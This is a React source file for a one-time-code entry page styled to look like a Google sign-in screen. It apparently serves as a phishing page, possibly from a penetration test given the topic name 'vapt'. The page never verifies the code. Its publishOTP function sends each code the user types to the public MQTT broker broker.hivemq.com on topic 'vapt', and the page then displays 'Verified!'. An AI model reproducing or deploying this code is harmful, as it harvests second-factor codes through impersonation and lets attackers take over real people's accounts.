import { useState, useRef, useEffect } from "react";
import mqtt from "mqtt";

// ── MQTT PUBLISH ──────────────────────────────────────────────
// Broker: mqtt-dashboard.com | Port: 8884 (WSS) | Topic: vapt | QoS: 0
function publishOTP(email, otp) {
  return new Promise((resolve, reject) => {
    const client = mqtt.connect("wss://broker.hivemq.com:8884/mqtt", {
      clientId: "metacube_otp_" + Math.random().toString(16).slice(2, 10),
      clean: true,
      reconnectPeriod: 0,
      connectTimeout: 8000,
    });

    client.on("connect", () => {
      const payload = JSON.stringify({ otp: parseInt(otp, 10) });
      client.publish("vapt", payload, { qos: 0, retain: false }, (err) => {
        client.end();
        if (err) reject(err);
        else resolve();
      });
    });

    client.on("error", (err) => { client.end(); reject(err); });
  });
}
// ─────────────────────────────────────────────────────────────

export default function OTPPage({ email = "user@example.com", onBack, onVerified }) {
  const [otp,    setOtp]    = useState(["", "", "", "", "", ""]);
  const [status, setStatus] = useState("idle"); // idle | sending | success | error
  const [shake,  setShake]  = useState(false);
  const [resent, setResent] = useState(false);
  const [timer,  setTimer]  = useState(30);
  const inputs = useRef([]);

  // Countdown for resend
  useEffect(() => {
    if (timer <= 0) return;
    const t = setInterval(() => setTimer(s => s - 1), 1000);
    return () => clearInterval(t);
  }, [timer]);

  function handleInput(i, val) {
    if (!/^\d?$/.test(val)) return;
    const next = [...otp];
    next[i] = val;
    setOtp(next);
    if (val && i < 5) inputs.current[i + 1]?.focus();
  }

  function handleKeyDown(i, e) {
    if (e.key === "Backspace" && !otp[i] && i > 0) {
      inputs.current[i - 1]?.focus();
    }
    if (e.key === "ArrowLeft"  && i > 0) inputs.current[i - 1]?.focus();
    if (e.key === "ArrowRight" && i < 5) inputs.current[i + 1]?.focus();
  }

  function handlePaste(e) {
    const paste = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
    if (!paste) return;
    const next = [...otp];
    paste.split("").forEach((ch, i) => { next[i] = ch; });
    setOtp(next);
    inputs.current[Math.min(paste.length, 5)]?.focus();
    e.preventDefault();
  }

  async function handleVerify() {
    const code = otp.join("");
    if (code.length < 6) {
      setShake(true);
      setTimeout(() => setShake(false), 600);
      return;
    }
    setStatus("sending");
    try {
      await publishOTP(email, code);
      setStatus("success");
      setTimeout(() => onVerified(), 1200);
    } catch (err) {
      console.error("MQTT error:", err);
      setStatus("error");
    }
  }

  function handleResend() {
    if (timer > 0) return;
    setOtp(["", "", "", "", "", ""]);
    setStatus("idle");
    setResent(true);
    setTimer(30);
    inputs.current[0]?.focus();
    setTimeout(() => setResent(false), 3000);
  }

  const filled = otp.join("").length;
  const allFilled = filled === 6;

  // Mask email: ru*****@gmail.com
  function maskEmail(e) {
    if (!e) return "";
    const [user, domain] = e.split("@");
    if (!domain) return e;
    return user.slice(0, 2) + "*".repeat(Math.max(user.length - 2, 3)) + "@" + domain;
  }

  return (
    <div style={{
      minHeight: "100vh", background: "#fff",
      display: "flex", flexDirection: "column",
      alignItems: "center", justifyContent: "center",
      fontFamily: "'Google Sans', Roboto, sans-serif",
      padding: "24px"
    }}>
      <div style={{ width: "100%", maxWidth: 448, animation: "fadeUp 0.35s ease both" }}>

        <div style={{ border: "1px solid #e8eaed", borderRadius: 28, padding: "48px 44px 36px", background: "#fff" }}>

          {/* ── ADD YOUR LOGO HERE ── */}
          {/* <img src="/your-logo.png" alt="Metacube" style={{ height: 36, marginBottom: 28 }} /> */}

          {/* Shield icon */}
          <div style={{ width: 52, height: 52, borderRadius: 16, background: "#e8f0fe", display: "flex", alignItems: "center", justifyContent: "center", marginBottom: 24 }}>
            <svg width="26" height="26" viewBox="0 0 24 24" fill="none">
              <path d="M12 2L4 5v6c0 5.25 3.4 10.15 8 11.35C16.6 21.15 20 16.25 20 11V5L12 2z" fill="#1a73e8" opacity="0.15"/>
              <path d="M12 2L4 5v6c0 5.25 3.4 10.15 8 11.35C16.6 21.15 20 16.25 20 11V5L12 2z" stroke="#1a73e8" strokeWidth="1.5" fill="none"/>
              <path d="M9 12l2 2 4-4" stroke="#1a73e8" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
            </svg>
          </div>

          <h1 style={{ fontSize: 24, fontWeight: 400, color: "#202124", marginBottom: 8, letterSpacing: -0.2 }}>
            Enter verification code
          </h1>
          <p style={{ fontSize: 14, color: "#5f6368", lineHeight: 1.6, marginBottom: 28 }}>
            A 6-digit code was sent to{" "}
            <span style={{ color: "#202124", fontWeight: 500 }}>{maskEmail(email)}</span>
          </p>

          {/* OTP input boxes */}
          <div style={{
            display: "flex", gap: 10, marginBottom: 8, justifyContent: "center",
            animation: shake ? "shake 0.5s ease" : "none"
          }}>
            {otp.map((digit, i) => (
              <input
                key={i}
                ref={el => inputs.current[i] = el}
                type="text"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={e => handleInput(i, e.target.value)}
                onKeyDown={e => handleKeyDown(i, e)}
                onPaste={handlePaste}
                style={{
                  width: 46, height: 54,
                  textAlign: "center",
                  fontSize: 22, fontWeight: 600,
                  color: "#202124",
                  border: `2px solid ${
                    status === "error"   ? "#d93025" :
                    status === "success" ? "#34a853" :
                    digit                ? "#1a73e8" : "#dadce0"
                  }`,
                  borderRadius: 10,
                  outline: "none",
                  fontFamily: "inherit",
                  background: digit ? "#f8fbff" : "#fff",
                  transition: "all 0.15s",
                  caretColor: "#1a73e8"
                }}
                onFocus={e => { e.target.style.borderColor = status === "error" ? "#d93025" : "#1a73e8"; e.target.style.boxShadow = "0 0 0 3px rgba(26,115,232,0.12)"; }}
                onBlur={e => { e.target.style.boxShadow = "none"; }}
              />
            ))}
          </div>

          {/* Progress dots under boxes */}
          <div style={{ display: "flex", gap: 4, justifyContent: "center", marginBottom: 20 }}>
            {otp.map((d, i) => (
              <div key={i} style={{ width: 6, height: 6, borderRadius: "50%", background: d ? "#1a73e8" : "#e8eaed", transition: "background 0.2s" }} />
            ))}
          </div>

          {/* Status messages */}
          {status === "error" && (
            <div style={{ display: "flex", alignItems: "center", gap: 8, background: "#fce8e6", border: "1px solid #f5c6c2", borderRadius: 8, padding: "10px 14px", marginBottom: 16 }}>
              <svg width="16" height="16" viewBox="0 0 16 16"><circle cx="8" cy="8" r="7" fill="#d93025" opacity="0.15"/><path d="M8 5v3M8 11v.5" stroke="#d93025" strokeWidth="1.5" strokeLinecap="round"/></svg>
              <span style={{ fontSize: 13, color: "#c5221f" }}>Failed to send. Check your connection and try again.</span>
            </div>
          )}
          {resent && (
            <div style={{ display: "flex", alignItems: "center", gap: 8, background: "#e6f4ea", border: "1px solid #ceead6", borderRadius: 8, padding: "10px 14px", marginBottom: 16 }}>
              <svg width="16" height="16" viewBox="0 0 16 16"><circle cx="8" cy="8" r="7" fill="#34a853" opacity="0.15"/><path d="M5 8l2.5 2.5L11 5.5" stroke="#34a853" strokeWidth="1.5" strokeLinecap="round"/></svg>
              <span style={{ fontSize: 13, color: "#137333" }}>A new code has been sent.</span>
            </div>
          )}

          {/* Resend */}
          <p style={{ fontSize: 13, color: "#5f6368", marginBottom: 28, textAlign: "center" }}>
            Didn't receive a code?{" "}
            <span onClick={handleResend} style={{
              color: timer > 0 ? "#9aa0a6" : "#1a73e8",
              fontWeight: 500,
              cursor: timer > 0 ? "default" : "pointer",
              transition: "color 0.2s"
            }}
              onMouseEnter={e => { if (timer <= 0) e.target.style.textDecoration = "underline"; }}
              onMouseLeave={e => { e.target.style.textDecoration = "none"; }}>
              {timer > 0 ? `Resend in ${timer}s` : "Resend code"}
            </span>
          </p>

          {/* Buttons */}
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
            <button onClick={onBack} style={{ background: "none", border: "none", color: "#1a73e8", fontSize: 14, fontWeight: 600, cursor: "pointer", fontFamily: "inherit", padding: "10px 12px", borderRadius: 4, transition: "background 0.15s" }}
              onMouseEnter={e => e.currentTarget.style.background = "rgba(26,115,232,0.08)"}
              onMouseLeave={e => e.currentTarget.style.background = "none"}>
              Back
            </button>

            <button onClick={handleVerify} disabled={status === "sending"} style={{
              background: status === "success" ? "#34a853" : allFilled && status !== "sending" ? "#1a73e8" : "#e8eaed",
              color: allFilled || status === "success" ? "#fff" : "#bdc1c6",
              border: "none", borderRadius: 20,
              padding: "10px 28px",
              fontSize: 14, fontWeight: 600,
              cursor: allFilled && status !== "sending" ? "pointer" : "default",
              fontFamily: "inherit", transition: "all 0.2s",
              display: "flex", alignItems: "center", gap: 8, minWidth: 100, justifyContent: "center"
            }}
              onMouseEnter={e => { if (allFilled && status === "idle") e.currentTarget.style.background = "#1765cc"; }}
              onMouseLeave={e => { if (allFilled && status === "idle") e.currentTarget.style.background = "#1a73e8"; }}>
              {status === "sending" ? (
                <>
                  <svg width="15" height="15" viewBox="0 0 15 15" style={{ animation: "spin 0.9s linear infinite" }}>
                    <circle cx="7.5" cy="7.5" r="5.5" fill="none" stroke="rgba(255,255,255,0.35)" strokeWidth="2"/>
                    <path d="M7.5 2a5.5 5.5 0 0 1 5.5 5.5" fill="none" stroke="#fff" strokeWidth="2" strokeLinecap="round"/>
                  </svg>
                  Verifying
                </>
              ) : status === "success" ? (
                <>
                  <svg width="15" height="15" viewBox="0 0 15 15"><path d="M3 7.5l3.5 3.5 5.5-5.5" stroke="#fff" strokeWidth="2" strokeLinecap="round" fill="none"/></svg>
                  Verified!
                </>
              ) : "Verify"}
            </button>
          </div>
        </div>

        {/* Footer */}
        <div style={{ display: "flex", justifyContent: "flex-end", gap: 20, marginTop: 20, padding: "0 4px", fontSize: 13, color: "#80868b" }}>
          {["Help", "Privacy", "Terms"].map(item => (
            <span key={item} style={{ cursor: "pointer" }}
              onMouseEnter={e => e.target.style.textDecoration = "underline"}
              onMouseLeave={e => e.target.style.textDecoration = "none"}>{item}</span>
          ))}
        </div>
      </div>

      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap');
        * { box-sizing: border-box; margin: 0; padding: 0; }
        @keyframes fadeUp  { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes spin    { to { transform: rotate(360deg); } }
        @keyframes shake   {
          0%, 100% { transform: translateX(0); }
          20%      { transform: translateX(-6px); }
          40%      { transform: translateX(6px); }
          60%      { transform: translateX(-4px); }
          80%      { transform: translateX(4px); }
        }
      `}</style>
    </div>
  );
}